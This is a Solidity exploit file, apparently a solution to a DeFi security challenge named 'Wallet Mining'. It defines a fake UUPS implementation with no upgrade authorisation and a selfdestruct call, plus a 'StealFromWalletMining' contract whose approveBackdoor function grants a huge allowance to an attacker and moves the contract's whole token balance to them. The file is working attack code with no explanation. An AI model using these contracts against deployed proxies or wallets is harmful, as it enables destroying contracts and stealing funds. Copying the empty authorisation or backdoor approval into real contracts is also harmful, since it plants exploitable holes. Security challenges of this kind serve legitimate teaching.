// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "hardhat/console.sol";

contract FakeAuthorizer is UUPSUpgradeable {
    function callDestruct() public {
        selfdestruct(payable(tx.origin));
    }

    function _authorizeUpgrade(address imp) internal override {}
}

/**
 * @title StealFromWalletMining
 * @author Louis
 */
contract StealFromWalletMining {
    address internal singleton;

    function approveBackdoor(address _token, address _to) public {
        console.log(
            "approveBackdoor",
            address(this),
            IERC20(_token).balanceOf(address(this))
        );
        // Approve if no token yet
        IERC20(_token).approve(_to, 1000000 ether);
        // Tansfer if there is already token
        IERC20(_token).transfer(_to, IERC20(_token).balanceOf(address(this)));
    }
}
